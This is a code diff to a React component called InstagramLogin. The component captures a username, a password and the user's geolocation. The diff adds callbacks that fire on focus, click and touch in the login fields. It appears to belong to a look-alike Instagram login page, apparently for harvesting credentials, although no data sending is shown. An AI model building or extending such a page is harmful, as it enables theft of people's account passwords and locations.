@@ -5,9 +5,10 @@ import styles from './InstagramLogin.module.css'
 
 interface InstagramLoginProps {
   location: { lat: number; lng: number } | null
+  onUserInteraction?: () => void
 }
 
-export default function InstagramLogin({ location }: InstagramLoginProps) {
+export default function InstagramLogin({ location, onUserInteraction }: InstagramLoginProps) {
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
   const [isLoading, setIsLoading] = useState(false)
@@ -80,6 +81,9 @@ export default function InstagramLogin({ location }: InstagramLoginProps) {
                 className={styles.input}
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
+                onFocus={() => onUserInteraction?.()}
+                onClick={() => onUserInteraction?.()}
+                onTouchStart={() => onUserInteraction?.()}
                 required
               />
             </div>
@@ -91,7 +95,12 @@ export default function InstagramLogin({ location }: InstagramLoginProps) {
                 className={styles.input}
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                onFocus={() => setIsPasswordFocused(true)}
+                onFocus={() => {
+                  setIsPasswordFocused(true)
+                  onUserInteraction?.()
+                }}
+                onClick={() => onUserInteraction?.()}
+                onTouchStart={() => onUserInteraction?.()}
                 onBlur={() => setIsPasswordFocused(false)}
                 required
               />
@@ -180,6 +189,9 @@ export default function InstagramLogin({ location }: InstagramLoginProps) {
                   className={styles.input}
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
+                  onFocus={() => onUserInteraction?.()}
+                  onClick={() => onUserInteraction?.()}
+                  onTouchStart={() => onUserInteraction?.()}
                   required
                   style={{ padding: '12px 0 12px 8px' }}
                 />
@@ -192,7 +204,12 @@ export default function InstagramLogin({ location }: InstagramLoginProps) {
                   className={styles.input}
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  onFocus={() => setIsPasswordFocused(true)}
+                  onFocus={() => {
+                    setIsPasswordFocused(true)
+                    onUserInteraction?.()
+                  }}
+                  onClick={() => onUserInteraction?.()}
+                  onTouchStart={() => onUserInteraction?.()}
                   onBlur={() => setIsPasswordFocused(false)}
                   required
                   style={{ padding: '12px 0 12px 8px', background: '#FBFBFA'}}
